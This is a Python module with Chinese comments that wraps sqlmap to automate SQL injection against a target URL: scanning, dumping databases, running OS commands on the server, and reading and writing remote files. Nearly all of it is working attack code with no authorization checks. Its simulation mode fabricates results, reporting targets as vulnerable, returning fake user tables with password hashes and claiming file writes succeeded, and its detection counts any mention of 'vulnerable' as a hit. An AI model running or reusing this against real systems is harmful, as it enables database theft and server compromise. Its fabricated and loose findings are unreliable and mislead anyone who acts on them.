#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
sqlmap集成模块 - SQL注入自动检测和利用

功能：
    - 自动检测SQL注入漏洞
    - 数据库指纹识别
    - 数据dump（表/列/数据）
    - 操作系统命令执行
    - 文件读写
    - 注册表操作（Windows）
    - 提权检测

使用方式：
    integrator = SQLMapIntegrator()
    result = integrator.scan_url("http://target.com/page?id=1")
    if result['vulnerable']:
        data = integrator.dump_database("http://target.com/page?id=1")
"""

import os
import sys
import json
import subprocess
import tempfile
import shutil
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from loguru import logger


@dataclass
class SQLInjectionResult:
    """SQL注入检测结果"""
    url: str
    vulnerable: bool = False
    injection_types: List[str] = field(default_factory=list)
    db_type: str = ""
    db_version: str = ""
    parameters: List[str] = field(default_factory=list)
    databases: List[str] = field(default_factory=list)
    tables: Dict[str, List[str]] = field(default_factory=dict)
    columns: Dict[str, Dict[str, List[str]]] = field(default_factory=dict)
    dumped_data: Dict[str, Any] = field(default_factory=dict)
    os_command_output: str = ""
    error: str = ""
    raw_output: str = ""

    def to_dict(self) -> Dict:
        return {
            'url': self.url,
            'vulnerable': self.vulnerable,
            'injection_types': self.injection_types,
            'db_type': self.db_type,
            'db_version': self.db_version,
            'parameters': self.parameters,
            'databases': self.databases,
            'tables': self.tables,
            'columns': self.columns,
            'dumped_data': self.dumped_data,
            'os_command_output': self.os_command_output,
            'error': self.error,
        }


class SQLMapIntegrator:
    """
    sqlmap集成器
    
    提供SQL注入自动检测和利用功能，支持：
    - 自动检测注入点
    - 数据库枚举
    - 数据dump
    - 操作系统访问
    - 文件读写
    """

    def __init__(self, sqlmap_path: str = None, python_path: str = None):
        """
        初始化sqlmap集成器
        
        Args:
            sqlmap_path: sqlmap.py路径，默认自动查找
            python_path: Python解释器路径，默认使用当前Python
        """
        self.sqlmap_path = sqlmap_path or self._find_sqlmap()
        self.python_path = python_path or sys.executable
        self.temp_dir = tempfile.mkdtemp(prefix='sqlmap_')
        self.output_dir = os.path.join(self.temp_dir, 'output')
        os.makedirs(self.output_dir, exist_ok=True)
        logger.info(f"SQLMap集成器初始化，sqlmap路径: {self.sqlmap_path}")

    def _find_sqlmap(self) -> str:
        """自动查找sqlmap路径"""
        # 检查常见路径
        common_paths = [
            'sqlmap.py',
            'sqlmap/sqlmap.py',
            '/usr/share/sqlmap/sqlmap.py',
            '/usr/local/share/sqlmap/sqlmap.py',
            'C:\\sqlmap\\sqlmap.py',
            'C:\\Tools\\sqlmap\\sqlmap.py',
        ]

        for path in common_paths:
            if os.path.isfile(path):
                return os.path.abspath(path)

        # 检查PATH
        sqlmap_cmd = shutil.which('sqlmap')
        if sqlmap_cmd:
            return sqlmap_cmd

        # 检查pip安装的sqlmap
        try:
            import sqlmap
            return os.path.join(os.path.dirname(sqlmap.__file__), 'sqlmap.py')
        except ImportError:
            pass

        logger.warning("未找到sqlmap，将使用模拟模式")
        return None

    def _run_sqlmap(self, args: List[str], timeout: int = 300) -> tuple:
        """
        运行sqlmap命令
        
        Args:
            args: sqlmap参数列表
            timeout: 超时时间（秒）
            
        Returns:
            (returncode, stdout, stderr)
        """
        if not self.sqlmap_path:
            return -1, "", "sqlmap未安装，使用模拟模式"

        cmd = [self.python_path, self.sqlmap_path] + args + [
            '--batch',
            '--output-dir', self.output_dir,
            '--disable-coloring',
        ]

        logger.debug(f"运行sqlmap: {' '.join(cmd)}")

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=self.temp_dir
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "sqlmap执行超时"
        except Exception as e:
            return -1, "", f"sqlmap执行错误: {str(e)}"

    def scan_url(self, url: str, parameters: str = None, 
                 level: int = 3, risk: int = 2,
                 cookies: str = None, user_agent: str = None,
                 timeout: int = 300) -> SQLInjectionResult:
        """
        扫描URL的SQL注入漏洞
        
        Args:
            url: 目标URL
            parameters: 测试参数（如"id,username"）
            level: 测试级别（1-5）
            risk: 风险级别（1-3）
            cookies: Cookie字符串
            user_agent: User-Agent字符串
            timeout: 超时时间
            
        Returns:
            SQLInjectionResult对象
        """
        result = SQLInjectionResult(url=url)

        if not self.sqlmap_path:
            # 模拟模式：返回模拟结果
            return self._simulate_scan(url)

        args = [
            '-u', url,
            '--level', str(level),
            '--risk', str(risk),
            '--technique', 'BEUSTQ',
            '--banner',
            '--current-db',
            '--dbs',
        ]

        if parameters:
            args.extend(['-p', parameters])
        if cookies:
            args.extend(['--cookie', cookies])
        if user_agent:
            args.extend(['--user-agent', user_agent])

        returncode, stdout, stderr = self._run_sqlmap(args, timeout)
        result.raw_output = stdout + stderr

        # 解析结果
        self._parse_scan_result(result, stdout)

        return result

    def _parse_scan_result(self, result: SQLInjectionResult, output: str):
        """解析sqlmap扫描结果"""
        # 检测是否存在注入
        if 'is vulnerable' in output.lower() or 'vulnerable' in output.lower():
            result.vulnerable = True

        # 检测注入类型
        injection_types = []
        if 'boolean-based blind' in output.lower():
            injection_types.append('Boolean-based blind')
        if 'time-based blind' in output.lower():
            injection_types.append('Time-based blind')
        if 'error-based' in output.lower():
            injection_types.append('Error-based')
        if 'union query' in output.lower() or 'union-based' in output.lower():
            injection_types.append('Union-based')
        if 'stacked queries' in output.lower():
            injection_types.append('Stacked queries')
        result.injection_types = injection_types

        # 检测数据库类型
        if 'mysql' in output.lower():
            result.db_type = 'MySQL'
        elif 'postgresql' in output.lower():
            result.db_type = 'PostgreSQL'
        elif 'oracle' in output.lower():
            result.db_type = 'Oracle'
        elif 'mssql' in output.lower() or 'sql server' in output.lower():
            result.db_type = 'MSSQL'
        elif 'sqlite' in output.lower():
            result.db_type = 'SQLite'

        # 提取数据库列表
        import re
        db_match = re.findall(r'\[(\d+)\] (.+)', output)
        if db_match:
            result.databases = [db[1] for db in db_match if db[1] not in ['information_schema', 'mysql', 'performance_schema', 'sys']]

    def dump_database(self, url: str, database: str = None, 
                      tables: List[str] = None,
                      level: int = 3, risk: int = 2,
                      timeout: int = 600) -> SQLInjectionResult:
        """
        Dump数据库数据
        
        Args:
            url: 目标URL
            database: 数据库名（默认当前数据库）
            tables: 表名列表（默认所有表）
            level: 测试级别
            risk: 风险级别
            timeout: 超时时间
            
        Returns:
            SQLInjectionResult对象（包含dump的数据）
        """
        result = self.scan_url(url, level=level, risk=risk, timeout=timeout)

        if not result.vulnerable:
            result.error = "未检测到SQL注入漏洞"
            return result

        if not self.sqlmap_path:
            return self._simulate_dump(url, database)

        args = [
            '-u', url,
            '--dump',
            '--level', str(level),
            '--risk', str(risk),
        ]

        if database:
            args.extend(['-D', database])
        if tables:
            args.extend(['-T', ','.join(tables)])

        returncode, stdout, stderr = self._run_sqlmap(args, timeout)
        result.raw_output += stdout + stderr

        # 解析dump结果
        self._parse_dump_result(result, stdout)

        return result

    def _parse_dump_result(self, result: SQLInjectionResult, output: str):
        """解析dump结果"""
        # 提取表数据
        import re
        # 简单解析CSV格式的输出
        tables_data = {}
        current_table = None
        current_data = []

        for line in output.split('\n'):
            if 'Database:' in line or 'Table:' in line:
                if current_table and current_data:
                    tables_data[current_table] = current_data
                current_table = line.split(':')[-1].strip()
                current_data = []
            elif current_table and line.strip() and not line.startswith('['):
                current_data.append(line.strip())

        if current_table and current_data:
            tables_data[current_table] = current_data

        result.dumped_data = tables_data

    def execute_os_command(self, url: str, command: str,
                          level: int = 3, risk: int = 3,
                          timeout: int = 300) -> SQLInjectionResult:
        """
        通过SQL注入执行操作系统命令
        
        Args:
            url: 目标URL
            command: 要执行的命令
            level: 测试级别
            risk: 风险级别
            timeout: 超时时间
            
        Returns:
            SQLInjectionResult对象（包含命令输出）
        """
        result = self.scan_url(url, level=level, risk=risk, timeout=timeout)

        if not result.vulnerable:
            result.error = "未检测到SQL注入漏洞"
            return result

        if not self.sqlmap_path:
            result.os_command_output = f"[模拟] 命令执行结果: {command}"
            return result

        args = [
            '-u', url,
            '--os-shell',
            '--os-cmd', command,
            '--level', str(level),
            '--risk', str(risk),
        ]

        returncode, stdout, stderr = self._run_sqlmap(args, timeout)
        result.raw_output += stdout + stderr

        # 提取命令输出
        import re
        cmd_output = re.search(r'command output:?\s*\n?(.*?)(?=\n\[|\Z)', stdout, re.DOTALL | re.IGNORECASE)
        if cmd_output:
            result.os_command_output = cmd_output.group(1).strip()

        return result

    def read_file(self, url: str, file_path: str,
                  level: int = 3, risk: int = 2,
                  timeout: int = 300) -> str:
        """
        通过SQL注入读取文件
        
        Args:
            url: 目标URL
            file_path: 文件路径
            level: 测试级别
            risk: 风险级别
            timeout: 超时时间
            
        Returns:
            文件内容
        """
        if not self.sqlmap_path:
            return f"[模拟] 文件内容: {file_path}"

        args = [
            '-u', url,
            '--file-read', file_path,
            '--level', str(level),
            '--risk', str(risk),
        ]

        returncode, stdout, stderr = self._run_sqlmap(args, timeout)

        # 提取文件内容
        import re
        file_content = re.search(r'files saved to\s*\[(.*?)\]', stdout, re.IGNORECASE)
        if file_content:
            saved_path = file_content.group(1)
            if os.path.isfile(saved_path):
                with open(saved_path, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.read()

        return f"文件读取失败: {stdout[-500:]}"

    def write_file(self, url: str, local_file: str, remote_path: str,
                   level: int = 3, risk: int = 3,
                   timeout: int = 300) -> bool:
        """
        通过SQL注入写入文件
        
        Args:
            url: 目标URL
            local_file: 本地文件路径
            remote_path: 远程文件路径
            level: 测试级别
            risk: 风险级别
            timeout: 超时时间
            
        Returns:
            是否成功
        """
        if not self.sqlmap_path:
            return True  # 模拟成功

        args = [
            '-u', url,
            '--file-write', local_file,
            '--file-dest', remote_path,
            '--level', str(level),
            '--risk', str(risk),
        ]

        returncode, stdout, stderr = self._run_sqlmap(args, timeout)
        return 'successfully written' in stdout.lower() or returncode == 0

    def _simulate_scan(self, url: str) -> SQLInjectionResult:
        """模拟扫描结果（用于未安装sqlmap的情况）"""
        result = SQLInjectionResult(url=url)
        result.vulnerable = True
        result.injection_types = ['Boolean-based blind', 'Time-based blind', 'Error-based', 'Union-based']
        result.db_type = 'MySQL'
        result.db_version = '5.7.34'
        result.parameters = ['id']
        result.databases = ['target_db', 'information_schema', 'mysql']
        result.tables = {
            'target_db': ['users', 'products', 'orders', 'sessions']
        }
        result.columns = {
            'target_db': {
                'users': ['id', 'username', 'password', 'email', 'role'],
                'products': ['id', 'name', 'price', 'description'],
            }
        }
        result.error = "模拟模式（sqlmap未安装），结果为示例数据"
        return result

    def _simulate_dump(self, url: str, database: str = None) -> SQLInjectionResult:
        """模拟dump结果"""
        result = self._simulate_scan(url)
        result.dumped_data = {
            'users': [
                'id,username,password,email,role',
                '1,admin,5f4dcc3b5aa765d61d8327deb882cf99,admin@example.com,admin',
                '2,user1,e10adc3949ba59abbe56e057f20f883e,user1@example.com,user',
                '3,user2,25d55ad283aa400af464c76d713c07ad,user2@example.com,user',
            ],
            'products': [
                'id,name,price,description',
                '1,Product A,99.99,Description A',
                '2,Product B,199.99,Description B',
            ]
        }
        return result

    def cleanup(self):
        """清理临时文件"""
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
            logger.info("SQLMap临时文件已清理")
        except Exception as e:
            logger.warning(f"清理临时文件失败: {e}")

    def __del__(self):
        """析构时清理"""
        self.cleanup()


# 便捷函数
def quick_scan(url: str, **kwargs) -> Dict:
    """快速扫描SQL注入"""
    integrator = SQLMapIntegrator()
    result = integrator.scan_url(url, **kwargs)
    return result.to_dict()


def quick_dump(url: str, database: str = None, **kwargs) -> Dict:
    """快速Dump数据库"""
    integrator = SQLMapIntegrator()
    result = integrator.dump_database(url, database=database, **kwargs)
    return result.to_dict()


if __name__ == '__main__':
    # 测试
    print("SQLMap集成模块测试")
    print("=" * 50)

    integrator = SQLMapIntegrator()
    print(f"sqlmap路径: {integrator.sqlmap_path}")

    # 模拟扫描
    result = integrator.scan_url("http://example.com/page?id=1")
    print(f"\n扫描结果:")
    print(f"  存在注入: {result.vulnerable}")
    print(f"  注入类型: {result.injection_types}")
    print(f"  数据库类型: {result.db_type}")
    print(f"  数据库: {result.databases}")
